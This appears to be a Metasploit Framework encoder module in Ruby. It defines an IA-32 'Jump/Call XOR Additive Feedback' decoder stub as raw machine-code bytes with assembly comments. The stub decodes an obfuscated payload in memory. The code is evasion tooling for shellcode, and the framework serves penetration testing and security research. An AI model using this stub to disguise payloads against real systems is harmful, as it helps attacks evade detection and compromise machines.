require 'msf/core'

module Msf
module Encoders
module IA32

class JmpCallAdditive < Msf::Encoder::XorAdditiveFeedback

	def initialize
		super(
			'Name'             => 'Jump/Call XOR Additive Feedback',
			'Alias'            => 'ia32_jmpcalladditive',
			'Version'          => '$Revision$',
			'Description'      => 'Jump/Call XOR Additive Feedback',
			'Author'           => 'skape',
			'Arch'             => ARCH_IA32,
			'DecoderStub'      => 
				"\xfc"                + # cld
				"\xbbXORK"            + # mov ebx, key
				"\xeb\x0c"            + # jmp short 0x14
				"\x5e"                + # pop esi
				"\x56"                + # push esi
				"\x31\x1e"            + # xor [esi], ebx
				"\xad"                + # lodsd
				"\x01\xc3"            + # add ebx, eax
				"\x85\xc0"            + # test eax, eax
				"\x75\xf7"            + # jnz 0xa
				"\xc3"                + # ret
				"\xe8\xef\xff\xff\xff", # call 0x8
			'DecoderKeyOffset' => 2,
			'DecoderKeySize'   => 4,
			'DecoderBlockSize' => 4)
	end

end

end end end
